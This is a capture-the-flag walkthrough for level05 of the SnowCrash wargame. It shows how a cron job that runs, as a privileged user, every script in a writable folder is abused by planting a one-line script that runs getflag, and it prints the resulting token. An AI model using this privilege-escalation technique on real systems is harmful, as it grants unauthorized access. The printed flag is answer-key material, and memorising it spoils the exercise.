## Level 05

## Clues


Upon the connexion to the level05 user we have this :
```
You have new mail.
level05@SnowCrash:~$
```

Lets check what's inside :

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This is clearly the clue for the flag, it appear to be a crontab.

It execute the command :
```
sh /usr/sbin/openarenaserver
```

Every 2 minute, as the user flag05, by using ***su - flag05***

Lets check what is the command its executing :

```
level05@SnowCrash:~$ /usr/sbin/openarenaserver
-bash: /usr/sbin/openarenaserver: Permission denied
```

We dont have right to execute it, so lets check what's inside :

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Its a Shell script that takes everything in the ***/opt/openarenaserver/*** folder, execute it, and delete it.

We know this script is executed as flag05, so the answer is obvious, we are going to make it run the getflag command.


## Solution

We are going to write a script in the ***/opt/openarenaserver/*** folder, that is going to execute getflag and redirect the output where its not going to be deleted by the automated script, and where we have hands on it, like /tmp.


```
level05@SnowCrash:~$ cd /opt/openarenaserver/
level05@SnowCrash:/opt/openarenaserver$ echo "echo \`getflag\` > /tmp/present.txt" > script.sh
```

So now, we are going to wait 2 minute, and it should execute our script, and then delete everything in this folder, but we should have the output stored in /tmp.

Lets wait .... :

```
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/present.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Folder is empty, this mean that the automated script just executed, and then tada ! It gave us our flag.

Im sure there is a lot more ways to get that flag, but this method works very well.

## What i learned

Writing crontab can be very dangerous, its very important to sanitize those very well.

More curiosity
